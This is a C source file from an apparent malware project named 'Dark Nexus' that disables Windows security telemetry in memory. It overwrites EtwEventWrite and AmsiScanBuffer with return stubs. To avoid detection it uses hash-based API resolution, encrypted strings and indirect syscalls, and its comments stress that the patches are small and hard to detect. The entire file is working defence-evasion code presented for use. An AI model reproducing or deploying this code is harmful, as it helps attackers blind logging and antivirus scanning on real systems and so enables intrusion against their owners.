#include "etw_patch.h"
#include "syscalls.h"
#include "api_resolve.h"
#include "strings_encrypt.h"

/*
 * Dark Nexus - ETW & AMSI Runtime Patching
 *
 * Technique: overwrite function prologues with short stubs
 * that return immediately with a "success" status code.
 * The function never executes its real body, so no events
 * are logged and no scans are performed.
 *
 * ETW patching silences ~1100 user-mode ETW providers.
 * AMSI patching disables script-level inspection for
 * PowerShell, .NET, VBScript, JScript, and WMI.
 *
 * Both use the minimum possible patch size (4-6 bytes)
 * and restore memory protection after writing.
 */

// -------------------------------------------------------------------
// ETW patch: EtwEventWrite in ntdll.dll
//
// Original prologue (varies by build):
//   4C 8B DC           mov r11, rsp
//   48 83 EC 58        sub rsp, 58h
//   ...
//
// Patch (x64):
//   33 C0              xor eax, eax    ; eax = 0 (STATUS_SUCCESS)
//   C3                 ret             ; return immediately
//
// Total: 3 bytes. Small patch footprint, hard to detect.
// -------------------------------------------------------------------

// x64 patch stub: xor eax, eax; ret
static const BYTE etw_patch_bytes[] = { 0x33, 0xC0, 0xC3 };
#define ETW_PATCH_SIZE sizeof(etw_patch_bytes)

BOOL dn_patch_etw(void) {
    // resolve EtwEventWrite via hash-based PEB walk (no IAT imports)
    PVOID ntdll = dn_get_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return FALSE;

    // decrypt function name, resolve by hash, zero buffer
    char buf[32];
    dn_decrypt_string(DN_STR_ETWWRITE, buf, sizeof(buf));
    PVOID pEtwEventWrite = dn_get_proc_by_hash(ntdll, dn_crc32b(buf));
    SecureZeroMemory(buf, sizeof(buf));
    if (!pEtwEventWrite) return FALSE;

    // make writable
    DWORD old_protect = 0;
    if (!VirtualProtect(pEtwEventWrite, ETW_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &old_protect))
        return FALSE;

    // write the patch
    memcpy(pEtwEventWrite, etw_patch_bytes, ETW_PATCH_SIZE);

    // restore protection
    VirtualProtect(pEtwEventWrite, ETW_PATCH_SIZE, old_protect, &old_protect);

    return TRUE;
}

// -------------------------------------------------------------------
// ETW patch using indirect syscalls (NtProtectVirtualMemory)
// Avoids the hooked VirtualProtect entirely
// -------------------------------------------------------------------
BOOL dn_patch_etw_syscall(void) {
    PVOID ntdll = dn_get_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return FALSE;

    char buf[32];
    dn_decrypt_string(DN_STR_ETWWRITE, buf, sizeof(buf));
    PVOID pEtwEventWrite = dn_get_proc_by_hash(ntdll, dn_crc32b(buf));
    SecureZeroMemory(buf, sizeof(buf));
    if (!pEtwEventWrite) return FALSE;

    // use syscall to change protection
    PVOID base = pEtwEventWrite;
    SIZE_T size = ETW_PATCH_SIZE;
    ULONG old_protect = 0;

    NTSTATUS status = DnNtProtectVirtualMemory(
        (HANDLE)-1,  // NtCurrentProcess
        &base, &size,
        PAGE_EXECUTE_READWRITE, &old_protect
    );
    if (status != 0) return FALSE;

    // write the patch
    memcpy(pEtwEventWrite, etw_patch_bytes, ETW_PATCH_SIZE);

    // restore protection via syscall
    base = pEtwEventWrite;
    size = ETW_PATCH_SIZE;
    DnNtProtectVirtualMemory(
        (HANDLE)-1, &base, &size,
        old_protect, &old_protect
    );

    return TRUE;
}

// -------------------------------------------------------------------
// AMSI patch: AmsiScanBuffer in amsi.dll
//
// AmsiScanBuffer is the central scan function. Patching it
// causes all AMSI consumers to receive AMSI_RESULT_CLEAN.
//
// Patch (x64):
//   B8 57 00 07 80     mov eax, 0x80070057  ; E_INVALIDARG
//   C3                 ret
//
// Total: 6 bytes. AMSI interprets E_INVALIDARG as
// "scan couldn't be performed" and defaults to allow.
//
// Note: amsi.dll may not be loaded yet. We LoadLibrary it
// first to ensure it's in the process, then patch.
// -------------------------------------------------------------------

static const BYTE amsi_patch_bytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#define AMSI_PATCH_SIZE sizeof(amsi_patch_bytes)

BOOL dn_patch_amsi(void) {
    // resolve LoadLibraryA via hash to force-load amsi.dll
    typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR);
    fnLoadLibraryA pLoadLib = (fnLoadLibraryA)dn_resolve(HASH_KERNEL32_DLL, HASH_LoadLibraryA);
    if (!pLoadLib) return TRUE; // can't resolve, skip gracefully

    char dll_buf[16];
    dn_decrypt_string(DN_STR_AMSI, dll_buf, sizeof(dll_buf));
    HMODULE amsi = pLoadLib(dll_buf);
    SecureZeroMemory(dll_buf, sizeof(dll_buf));

    if (!amsi) {
        // amsi.dll not available (older Windows or stripped), skip
        return TRUE;
    }

    // resolve AmsiScanBuffer via encrypted string + hash
    char fn_buf[32];
    dn_decrypt_string(DN_STR_AMSISCAN, fn_buf, sizeof(fn_buf));
    PVOID pAmsiScanBuffer = dn_get_proc_by_hash((PVOID)amsi, dn_crc32b(fn_buf));
    SecureZeroMemory(fn_buf, sizeof(fn_buf));
    if (!pAmsiScanBuffer) return FALSE;

    // use syscall-based protect if syscall engine is initialized
    PVOID base = pAmsiScanBuffer;
    SIZE_T size = AMSI_PATCH_SIZE;
    ULONG old_protect = 0;

    // try syscall path first
    if (g_SyscallTable.NtProtectVirtualMemory.resolved) {
        NTSTATUS status = DnNtProtectVirtualMemory(
            (HANDLE)-1, &base, &size,
            PAGE_EXECUTE_READWRITE, &old_protect
        );
        if (status != 0) {
            // fall back to VirtualProtect
            if (!VirtualProtect(pAmsiScanBuffer, AMSI_PATCH_SIZE, PAGE_EXECUTE_READWRITE, (PDWORD)&old_protect))
                return FALSE;
        }
    } else {
        if (!VirtualProtect(pAmsiScanBuffer, AMSI_PATCH_SIZE, PAGE_EXECUTE_READWRITE, (PDWORD)&old_protect))
            return FALSE;
    }

    // write the patch
    memcpy(pAmsiScanBuffer, amsi_patch_bytes, AMSI_PATCH_SIZE);

    // restore protection
    if (g_SyscallTable.NtProtectVirtualMemory.resolved) {
        base = pAmsiScanBuffer;
        size = AMSI_PATCH_SIZE;
        DnNtProtectVirtualMemory(
            (HANDLE)-1, &base, &size,
            old_protect, &old_protect
        );
    } else {
        VirtualProtect(pAmsiScanBuffer, AMSI_PATCH_SIZE, old_protect, (PDWORD)&old_protect);
    }

    return TRUE;
}

// -------------------------------------------------------------------
// Combined patching: ETW first, then AMSI
// Order matters: patch ETW before AMSI because AMSI loading
// itself generates ETW events we want to suppress.
// -------------------------------------------------------------------
int dn_patch_all(void) {
    int count = 0;

    // ETW first (suppress telemetry before doing anything else)
    if (g_SyscallTable.NtProtectVirtualMemory.resolved) {
        if (dn_patch_etw_syscall()) count++;
    } else {
        if (dn_patch_etw()) count++;
    }

    // AMSI second
    if (dn_patch_amsi()) count++;

    return count;
}
